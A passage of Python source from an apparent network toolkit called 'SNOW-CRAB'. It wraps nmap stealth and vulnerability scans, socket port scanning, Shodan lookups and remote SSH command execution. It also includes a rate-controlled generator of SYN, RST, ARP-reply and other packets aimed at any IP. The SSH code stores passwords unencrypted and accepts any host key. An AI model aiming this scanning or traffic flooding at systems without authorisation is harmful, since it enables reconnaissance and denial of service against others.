        sys.stdout.write('\r' + ' ' * (len(message) + 10) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def glitch_effect(text: str, duration: float = 1.0):
        """Display glitch effect animation"""
        start_time = time.time()
        while time.time() - start_time < duration:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%', '$', '^'])
            glitched = ''.join(chars)
            colors = [Colors.BLUE, Colors.WHITE, Colors.LIGHTBLUE, Colors.LIGHTCYAN, Colors.CYAN]
            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write(f'\r{Colors.BLUE}{text}{Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def snowflake_fall(duration: float = 2.0):
        """Display snowflake falling animation"""
        snowflakes = ['❄', '❅', '❆', '✻', '✼', '❋']
        start_time = time.time()
        while time.time() - start_time < duration:
            for i in range(20):
                sys.stdout.write(f'\r{" " * random.randint(0, 80)}{random.choice(snowflakes)}')
                sys.stdout.flush()
                time.sleep(0.05)
            sys.stdout.write('\r' + ' ' * 80 + '\r')
            sys.stdout.flush()
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def crab_walk(duration: float = 2.0):
        """Display crab walking animation"""
        crab_frames = [
            "   🦀   ",
            "  🦀    ",
            " 🦀     ",
            "🦀      ",
            " 🦀     ",
            "  🦀    ",
            "   🦀   "
        ]
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.BLUE}{crab_frames[i % len(crab_frames)]}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.15)
            i += 1
        sys.stdout.write('\r' + ' ' * 10 + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def cyber_scan_animation(duration: float = 2.0):
        """Display cyber scan animation"""
        scan_chars = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█', '▇', '▆', '▅', '▄', '▃', '▂']
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            bar = ''.join(random.choice(scan_chars) for _ in range(30))
            color = random.choice([Colors.BLUE, Colors.WHITE, Colors.LIGHTBLUE])
            sys.stdout.write(f'\r{color}[{bar}]{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * 40 + '\r')
        sys.stdout.flush()

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Network utility functions"""
    
    @staticmethod
    def ping(target: str, count: int = 4, timeout: int = 10, size: int = 56) -> CommandResult:
        """Ping a target"""
        start_time = time.time()
        try:
            system = platform.system().lower()
            if system == 'windows':
                cmd = ['ping', '-n', str(count), '-w', str(timeout * 1000), '-l', str(size), target]
            else:
                cmd = ['ping', '-c', str(count), '-W', str(timeout), '-s', str(size), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout * count + 5)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except subprocess.TimeoutExpired:
            return CommandResult(False, "Ping timed out", time.time() - start_time, "Timeout")
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ping_sweep(network: str, timeout: int = 1) -> CommandResult:
        """Ping sweep a network"""
        start_time = time.time()
        try:
            if shutil.which('nmap'):
                cmd = ['nmap', '-sn', '-T4', network]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                execution_time = time.time() - start_time
                return CommandResult(
                    success=result.returncode == 0,
                    output=result.stdout + result.stderr,
                    execution_time=execution_time
                )
            elif shutil.which('fping'):
                cmd = ['fping', '-a', '-g', network]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                execution_time = time.time() - start_time
                return CommandResult(
                    success=result.returncode == 0,
                    output=result.stdout + result.stderr,
                    execution_time=execution_time
                )
            else:
                return CommandResult(False, "No ping sweep tool available (install nmap or fping)", 0)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30, timeout: int = 60) -> CommandResult:
        """Trace route to a target"""
        start_time = time.time()
        try:
            system = platform.system().lower()
            if system == 'windows':
                cmd = ['tracert', '-h', str(max_hops), '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', '-m', str(max_hops), target]
                else:
                    cmd = ['traceroute', '-m', str(max_hops), '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except subprocess.TimeoutExpired:
            return CommandResult(False, "Traceroute timed out", time.time() - start_time, "Timeout")
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick", ports: str = None, 
                  additional_args: List[str] = None) -> CommandResult:
        """Run an nmap scan"""
        start_time = time.time()
        try:
            if not shutil.which('nmap'):
                return CommandResult(False, "Nmap not installed", 0, "Nmap not found")
            
            cmd = ['nmap']
            
            if scan_type == "quick":
                cmd.extend(['-T4', '-F'])
            elif scan_type == "full":
                cmd.extend(['-p-', '-T4'])
            elif scan_type == "stealth":
                cmd.extend(['-sS', '-T2'])
            elif scan_type == "udp":
                cmd.extend(['-sU', '-T4'])
            elif scan_type == "os":
                cmd.extend(['-O', '-T4'])
            elif scan_type == "service":
                cmd.extend(['-sV', '-T4'])
            elif scan_type == "version":
                cmd.extend(['-sV', '--version-intensity', '9'])
            elif scan_type == "vulnerability":
                cmd.extend(['--script', 'vuln', '-T4'])
            elif scan_type == "comprehensive":
                cmd.extend(['-sS', '-sV', '-sC', '-O', '-A', '-T4'])
            elif scan_type == "web":
                cmd.extend(['-p', '80,443,8080,8443', '-sV', '--script', 'http-*'])
            else:
                cmd.extend(['-T4', '-F'])
            
            if ports:
                cmd.extend(['-p', ports])
            
            if additional_args:
                cmd.extend(additional_args)
            
            cmd.append(target)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except subprocess.TimeoutExpired:
            return CommandResult(False, "Nmap scan timed out", time.time() - start_time, "Timeout")
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget_download(url: str, output: str = None, timeout: int = 60) -> CommandResult:
        """Download a file using wget"""
        start_time = time.time()
        try:
            cmd = ['wget', '-q', '--timeout=' + str(timeout)]
            if output:
                cmd.extend(['-O', output])
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", data: str = None, 
                     headers: Dict = None, timeout: int = 30) -> CommandResult:
        """Make an HTTP request using curl"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-k', '--max-time', str(timeout)]
            
            if method.upper() == "POST":
                cmd.extend(['-X', 'POST'])
                if data:
                    cmd.extend(['-d', data])
            elif method.upper() == "PUT":
                cmd.extend(['-X', 'PUT'])
                if data:
                    cmd.extend(['-d', data])
            elif method.upper() == "DELETE":
                cmd.extend(['-X', 'DELETE'])
            elif method.upper() == "HEAD":
                cmd.extend(['-I'])
            
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat_connect(host: str, port: int, data: str = None, timeout: int = 10) -> CommandResult:
        """Connect to a host using netcat"""
        start_time = time.time()
        try:
            nc_path = shutil.which('nc') or shutil.which('ncat')
            if not nc_path:
                return CommandResult(False, "Netcat not installed", 0, "nc/ncat not found")
            
            cmd = [nc_path, '-zv', '-w', str(timeout), host, str(port)]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois_lookup(domain: str) -> CommandResult:
        """Perform a WHOIS lookup"""
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                if not shutil.which('whois'):
                    return CommandResult(False, "WHOIS not available", 0, "whois not installed")
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> CommandResult:
        """Perform a DNS lookup"""
        start_time = time.time()
        try:
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    output = f"DNS {record_type} records for {domain}:\n"
                    for rdata in answers:
                        output += f"  {rdata}\n"
                    execution_time = time.time() - start_time
                    return CommandResult(True, output, execution_time)
                except dns.resolver.NXDOMAIN:
                    return CommandResult(False, f"Domain {domain} does not exist", time.time() - start_time)
                except dns.resolver.NoAnswer:
                    return CommandResult(False, f"No {record_type} records found for {domain}", time.time() - start_time)
            else:
                if shutil.which('dig'):
                    cmd = ['dig', domain, record_type, '+short']
                else:
                    cmd = ['nslookup', '-type=' + record_type, domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def get_geolocation(ip: str) -> Dict:
        """Get geolocation information for an IP"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'org': data.get('org', 'Unknown'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0),
                        'timezone': data.get('timezone', 'Unknown'),
                        'zip': data.get('zip', 'Unknown')
                    }
            return {'success': False}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_public_ip() -> Optional[str]:
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        """Get MAC address vendor"""
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None
    
    @staticmethod
    def resolve_domain(domain: str) -> Optional[str]:
        """Resolve a domain to IP"""
        try:
            return socket.gethostbyname(domain)
        except:
            return None
    
    @staticmethod
    def reverse_dns(ip: str) -> Optional[str]:
        """Reverse DNS lookup"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
    
    @staticmethod
    def port_scan(host: str, ports: List[int] = None, timeout: float = 1.0) -> List[PortScanResult]:
        """Simple port scan using sockets"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        results = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    results.append(PortScanResult(port=port, state="open", service=service))
                sock.close()
            except:
                pass
        
        return results

# =====================
# SHODAN ENGINE
# =====================
class ShodanEngine:
    """Shodan API integration"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.api_key = config.get('shodan.api_key', '')
        self.api = None
        
        if SHODAN_AVAILABLE and self.api_key:
            try:
                self.api = shodan.Shodan(self.api_key)
            except Exception as e:
                logger.error(f"Failed to initialize Shodan: {e}")
    
    def is_available(self) -> bool:
        """Check if Shodan is available"""
        return SHODAN_AVAILABLE and self.api is not None
    
    def search(self, query: str, limit: int = 10) -> CommandResult:
        """Search Shodan"""
        start_time = time.time()
        
        if not self.is_available():
            return CommandResult(False, "Shodan API not configured", 0, "Shodan API key required")
        
        try:
            results = self.api.search(query, limit=limit)
            execution_time = time.time() - start_time
            
            output = f"🔍 Shodan Search Results for: {query}\n"
            output += f"Total Results: {results.get('total', 0)}\n"
            output += "=" * 50 + "\n\n"
            
            for match in results.get('matches', [])[:limit]:
                output += f"IP: {match.get('ip_str', 'N/A')}\n"
                output += f"Port: {match.get('port', 'N/A')}\n"
                output += f"Organization: {match.get('org', 'N/A')}\n"
                output += f"Location: {match.get('location', {}).get('country_name', 'N/A')}\n"
                output += f"Product: {match.get('product', 'N/A')}\n"
                output += "-" * 40 + "\n"
            
            return CommandResult(True, output, execution_time)
        except shodan.APIError as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def host_info(self, ip: str) -> CommandResult:
        """Get host information from Shodan"""
        start_time = time.time()
        
        if not self.is_available():
            return CommandResult(False, "Shodan API not configured", 0, "Shodan API key required")
        
        try:
            host = self.api.host(ip)
            execution_time = time.time() - start_time
            
            output = f"🔍 Shodan Host Information for: {ip}\n"
            output += "=" * 50 + "\n"
            output += f"Organization: {host.get('org', 'N/A')}\n"
            output += f"Operating System: {host.get('os', 'N/A')}\n"
            output += f"Country: {host.get('country_name', 'N/A')}\n"
            output += f"City: {host.get('city', 'N/A')}\n"
            output += f"Last Update: {host.get('last_update', 'N/A')}\n"
            output += "\nOpen Ports:\n"
            
            for port in host.get('ports', []):
                output += f"  • {port}\n"
            
            output += "\nVulnerabilities:\n"
            for vuln in host.get('vulns', []):
                output += f"  • {vuln}\n"
            
            return CommandResult(True, output, execution_time)
        except shodan.APIError as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def dns_lookup(self, domain: str) -> CommandResult:
        """DNS lookup via Shodan"""
        start_time = time.time()
        
        if not self.is_available():
            return CommandResult(False, "Shodan API not configured", 0, "Shodan API key required")
        
        try:
            domain_info = self.api.dns.resolve(domain)
            execution_time = time.time() - start_time
            
            output = f"🔍 Shodan DNS Lookup for: {domain}\n"
            output += "=" * 50 + "\n"
            
            for record in domain_info:
                output += f"Type: {record.get('type', 'N/A')}\n"
                output += f"Value: {record.get('value', 'N/A')}\n"
                output += "-" * 30 + "\n"
            
            return CommandResult(True, output, execution_time)
        except shodan.APIError as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def get_my_ip(self) -> CommandResult:
        """Get your public IP via Shodan"""
        start_time = time.time()
        
        if not self.is_available():
            return CommandResult(False, "Shodan API not configured", 0, "Shodan API key required")
        
        try:
            ip = self.api.tools.myip()
            execution_time = time.time() - start_time
            return CommandResult(True, f"Your Public IP: {ip}", execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def scan(self, ip: str) -> CommandResult:
        """Request Shodan to scan an IP"""
        start_time = time.time()
        
        if not self.is_available():
            return CommandResult(False, "Shodan API not configured", 0, "Shodan API key required")
        
        try:
            scan = self.api.scan(ip)
            execution_time = time.time() - start_time
            output = f"🔍 Shodan Scan Requested for: {ip}\n"
            output += f"Scan ID: {scan.get('id', 'N/A')}\n"
            output += f"Status: {scan.get('status', 'N/A')}\n"
            return CommandResult(True, output, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        """Check if SSH is available"""
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        """Add an SSH connection"""
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        """Connect to an SSH server"""
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.update_ssh_status(conn_id, 'connected')
            return True
        except Exception as e:
            logger.error(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        """Disconnect from an SSH server"""
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.update_ssh_status(conn_id, 'disconnected')
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        """Execute a command on an SSH server"""
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows
    
    def delete_connection(self, conn_id: str) -> bool:
        """Delete an SSH connection"""
        self.disconnect(conn_id)
        return self.db.delete_ssh_connection(conn_id)

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Traffic generation engine"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        """Generate traffic"""
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'dns_query': 53, 'tcp_syn': 80, 
                'tcp_connect': 80, 'udp': 53, 'smtp': 25,
                'ftp': 21, 'ssh': 22, 'telnet': 23
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        """Run the traffic generator"""
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        """Get the traffic generator function for a type"""
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'tcp_fin': self._tcp_fin,
            'tcp_rst': self._tcp_rst,
            'tcp_psh_ack': self._tcp_psh_ack,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'dns_query': self._dns,
            'arp': self._arp,
            'arp_reply': self._arp_reply,
            'dhcp': self._dhcp,
            'ntp': self._ntp,
            'snmp': self._snmp,
            'smtp': self._smtp,
            'ftp': self._ftp,
            'ssh': self._ssh,
            'telnet': self._telnet,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        """Send ICMP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        """Send TCP SYN packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        """Send TCP ACK packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_fin(self, target: str, port: int) -> int:
        """Send TCP FIN packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="F")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_rst(self, target: str, port: int) -> int:
        """Send TCP RST packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="R")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_psh_ack(self, target: str, port: int) -> int:
        """Send TCP PSH-ACK packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="PA")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        """Perform TCP connect"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        """Send UDP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"SNOWCRAB"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"SNOWCRAB", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        """Send HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "SNOW-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        """Send HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "SNOW-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        """Send HTTPS request"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "SNOW-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        """Send DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        """Send ARP request"""
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _arp_reply(self, target: str, port: int) -> int:
        """Send ARP reply"""
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff")
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _dhcp(self, target: str, port: int) -> int:
        """Send DHCP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _ntp(self, target: str, port: int) -> int:
        """Send NTP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=123)/b'\x1b' + 47 * b'\0'
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _snmp(self, target: str, port: int) -> int:
        """Send SNMP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=161)/b'\x30\x26\x02\x01\x01\x04\x06public'
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _smtp(self, target: str, port: int) -> int:
        """Send SMTP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.send(b"EHLO snowcrab.com\r\n")
            data = sock.recv(1024)
            sock.close()
            return len(data) + 50
        except:
            return 0
    
    def _ftp(self, target: str, port: int) -> int:
        """Send FTP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            data = sock.recv(1024)
            sock.close()
            return len(data) + 50
        except:
            return 0
    
    def _ssh(self, target: str, port: int) -> int:
        """Send SSH packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            data = sock.recv(1024)
            sock.close()
            return len(data) + 100
        except:
            return 0
    
    def _telnet(self, target: str, port: int) -> int:
        """Send Telnet packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            data = sock.recv(1024)
            sock.close()
            return len(data) + 50
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        """Send mixed traffic"""
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        """Send random traffic"""
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        """Get local MAC address"""
        try:
